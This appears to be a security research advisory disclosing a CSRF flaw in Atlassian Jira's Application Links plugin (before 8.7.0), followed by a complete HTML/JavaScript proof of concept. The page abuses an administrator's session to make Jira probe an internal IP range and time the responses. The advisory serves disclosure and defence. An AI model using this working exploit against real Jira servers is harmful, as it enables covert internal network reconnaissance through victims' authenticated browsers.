### Description

Atlassian Jira Server and Data Center before version 8.7.0 use a version of the Atlassian Application Links plugin that is vulnerable to cross-site request forgery (CSRF). An attacker could exploit this by tricking an administrative user into making malicious HTTP requests, allowing the attacker to enumerate hosts and open ports on the internal network where the Jira server is present. See <https://ecosystem.atlassian.net/browse/APL-1390> for further details.

# Atlassian Jira CSRF

Medium

[← View More Research Advisories](/security/research)
### Synopsis

It is possible to perform a CSRF on the following request for configuring application links: /rest/applinks/3.0/applicationlinkForm/manifest.json

To exploit this vulnerability an attacker would need to convince a user with an active WebSudo session (and permissions to create application links,) to click on a crafted link.

#### Proof of Concept:

The below code generates a request to the Jira server to initiate the process of creating an application link for a range of IP addresses (this script was set to test the range 172.16.68.220-240 on port 80). The script times how long it takes to get a response from each host, and posts it on a textArea on the web page.

```

<html>
  <head>
     <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <h2>CSRF Host Discovery Scanner via the Application Links</h2>

    <p><button onclick="startScan()">scan</button>
    <br>
    <textarea id="textarea" rows=34 cols=50></textarea>

    <script>
      function startScan() {
        doFetch('172.16.68.151', 220, 240);
      }

      function doFetch(jiraIp, currentIp, endIp) {
        var timer = Date.now();
        var url = '172.16.68.' + currentIp.toString();
        fetch('http://' + jiraIp + ':8080/rest/applinks/3.0/applicationlinkForm/manifest.json?url=http://' + url +'/insertMessageHere:80&_=1572448964763',
        {
          method: 'GET',
          credentials: 'include'
        })
        .then(function(response) {
          return response.text();
        })
        .then(function(text) {
          timer = Date.now() - timer;
          document.getElementById("textarea").value += "\nip: " + url + " \tResponse time: " + timer + "ms";
          if (currentIp < endIp)
            doFetch(jiraIp, currentIp + 1, endIp);
        })
      }
    </script>
  </body>
</html>

```
